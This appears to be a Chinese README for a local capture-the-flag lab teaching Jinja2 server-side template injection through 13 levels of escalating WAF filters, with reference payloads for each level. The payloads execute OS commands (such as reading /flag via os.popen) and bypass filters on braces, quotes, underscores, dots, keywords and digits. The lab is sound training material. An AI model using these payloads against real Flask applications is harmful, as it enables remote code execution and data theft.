# 02 · Jinja2 13 关 WAF 链

| | |
|---|---|
| 端口 | `8082`（`JINJA_CHAIN_PORT` 可改） |
| 引擎 | Jinja2（Flask `render_template_string`） |
| 关卡数 | 13（id `0`–`12`） |
| 依赖网络 | 否 |
| flag | 容器内 `/flag`，由环境变量写入 |

## 这个靶场在教什么

同一个注入点，13 关，**每关只加一条过滤规则**。目的不是让你背 payload，而是让你
建立一条判断链：

1. 我的 payload 死在**哪一条规则**上？
2. 这条规则封掉的是**语法**还是**字符**？
3. 同一个语义还有没有别的**语法面**可以表达？

第 3 关（id `2`）是**盲渲染**：只回显 `correct` / `wrong`。它教你无回显条件下
如何把「拿到数据」转换成「控制成功与否」——这是后面 `06-blind-ssti` 和
`07-flask-memshell` 的前置技能。

## 关卡表

| id | 关卡 | 过滤内容 | 关键思路 |
|----|------|----------|----------|
| 0 | L1 无过滤 | — | `{{7*7}}`；`config` / `lipsum.__globals__` 两条链 |
| 1 | L2 拦截 `{{` | 子串 `{{` | 用语句块 `{% print(...) %}` |
| 2 | L3 盲渲染 | 无过滤，但只回显 correct/wrong | 把数据变成成功/失败信号 |
| 3 | L4 禁止方括号 | `[` `]` | `\|first` / `\|last` / `\|list` 替代下标 |
| 4 | L5 禁止引号 | `'` `"` | `request.args.x` 取字符串 |
| 5 | L6 禁止下划线 | `_` | `\|attr` 接受字符串属性名 |
| 6 | L7 禁止点号 | `.` | `\|attr` 或 `[]`（本关方括号未禁） |
| 7 | L8 关键字黑名单 | 12 个子串（大小写敏感） | 字符串拼接 + `\|attr` |
| 8 | L9 禁止数字 | `0`–`9` | `true\|int`、`\|length` 凑整数 |
| 9 | L10 前缀置空 | 载荷前拼 `{% set config=None%}{% set self=None%}` | 换未置空的全局入口 |
| 10 | L11 组合过滤 | `' " + . [ ]` 与 `request` | `\|join` 替代 `+`，绕过取值通道 |
| 11 | L12 强字符集 | 再加 `_`、数字、`\` | CTF 硬关 |
| 12 | L13 扩展关键字 | 符号 + `request/class/init/arg/config/app/self` | CTF 硬关；`init` 会命中 `print` |

## 参考解

下面标注「✅ 已验证」的 payload 由 `scripts/verify_labs.py` 实际跑过并断言了输出。

### L1（id 0）无过滤 ✅

```jinja2
{{7*7}}                          → 49
{{config}}                        → Flask 配置对象
{{lipsum.__globals__.os.popen('cat /flag').read()}}
```

### L2（id 1）拦截 `{{` ✅

被拦的是**模板定界符**，不是表达式：

```jinja2
{% print(7*7) %}                 → 49
{% print(lipsum.__globals__.os.popen('cat /flag').read()) %}
```

### L3（id 2）盲渲染 ✅

任意能成功渲染的模板都返回 `correct`。要读数据就把条件变成异常与否：

```jinja2
{% if <条件> %}{{ 1/0 }}{% endif %}
```

### L4（id 3）禁止 `[` `]` ✅

```jinja2
{{lipsum.__globals__.os.popen('cat /flag').read()}}      # 本来就不需要方括号
{{(1,2,3)|first}}                                         # 需要取元素时用过滤器
```

### L5（id 4）禁止引号 ✅

用 `request.args` 把字符串「从外部带进来」，payload 里一个引号都不出现：

```
POST /api/render
{"template": "{{lipsum.__globals__.os.popen(request.args.c).read()}}"}
# 同时传 ?c=cat /flag
```

或用过滤器把数字转成字符串：`{{7|string}}`。

### L6（id 5）禁止下划线

`|attr` 的参数是**字符串**，而字符串可以拼：

```jinja2
{{()|attr('_'~'_'~'class'~'_'~'_')}}
```

注意源码里出现了 `'_'~'_'`，但**没有出现子串 `__`** —— 这是整条链的核心技巧。

### L7（id 6）禁止点号

```jinja2
{{lipsum|attr('__globals__')|attr('os')|attr('popen')('cat /flag')|attr('read')()}}
```

本关方括号没有被禁，`[]` 也能替代点号。

### L8（id 7）关键字子串黑名单

`class` / `arg` / `attr` / `open` / `global` 等都写不出来，所以要拼接：

```jinja2
{{lipsum|attr('__glo'~'bals__')|attr('o'~'s')|attr('po'~'pen')('cat /flag')|attr('re'~'ad')()}}
```

也可以不打这条链，直接 `getattr` 改名拼接。

### L9（id 8）禁止数字

不能写 `chr(47)`。整数来源：

```jinja2
{{true|int}}          → 1
{{false|int}}         → 0
{{(1,2,3)|length}}    → 3（但本关连 1/2/3 都不能写）
{{lipsum|length}}     → 由对象长度得到整数，无需字面量
```

再用加减移位凑出 `47`（`/`）等需要的值。完整无数字通杀链较长，建议脚本生成。

### L10（id 9）前缀置空 config / self

`config` 与 `self` 被置空，但 `lipsum` / `cycler` / `joiner` / `namespace` / `request`
都还在 —— 直接换入口即可。上帝模式的 `template_after_waf` 能看到前缀确实被拼上了。

### L11（id 10）组合过滤

`+` 被禁 → 用 `|join`；`.` 被禁 → `|attr`；`[]` 被禁 → 用过滤器；
`request` 被禁 → 换其它取值通道（`session`、`config`、`url_for` 等）。

### L12（id 11）、L13（id 12）硬关

这两关是**刻意设计**的：符号与关键字表同时收紧到几乎无法写出一条完整链。
建议的练习方式：

1. 开**上帝模式**，提交一个小 payload，观察 `template_after_waf`（过滤后的模板）
   与 `exception_type`（是 WAF 拦了，还是载荷本身语法错了）。
2. 逐个字符确认「我最先失去的是哪一种表达能力」——字符串？属性名？整数？
3. 再考虑用剩下的语法面重建它。

如果你希望 L12/L13 在默认 Python 3.11 下**必有短解**，需要放宽对应的
`WafSpec`（改 `shared/ssti_core/levels/jinja.py` 里那一关的规则）。改完请
同步更新本文件的表格。

## 运行

```bash
# 1) 先构建统一前端镜像（只需一次）
scripts/build-frontend.sh            # Windows: scripts\build-frontend.ps1

# 2) 起单个靶场
cd labs/02-jinja-chain
docker compose up --build            # → http://127.0.0.1:8082

# 或在仓库根目录一次起全部
docker compose up -d
```

## 直接调 API（不依赖前端）

```bash
curl -s localhost:8082/api/lab-info | jq .levels[0]
curl -s -X POST localhost:8082/api/render \
     -H 'Content-Type: application/json' \
     -d '{"level":"1","mode":"god","template":"{% print(7*7) %}"}' | jq
```

## 上帝模式（出题人视角）

`mode=god` 会额外返回：

| 字段 | 用途 |
|------|------|
| `template_after_waf` | 过滤/拼接之后的真实模板 —— 确认规则到底怎么生效 |
| `raw_output` | 未经盲关包装的真实渲染结果 |
| `error` / `exception_type` | 区分「被 WAF 拦」与「载荷语法错」 |
| `source_class` | 触发渲染的关卡定义（便于定位代码） |

前端的 **关卡源码** 按钮会调 `/api/god/source`，直接显示那一关的
`WafSpec` 定义 —— 出题时改过滤规则、复盘时确认规则，比读文档快。
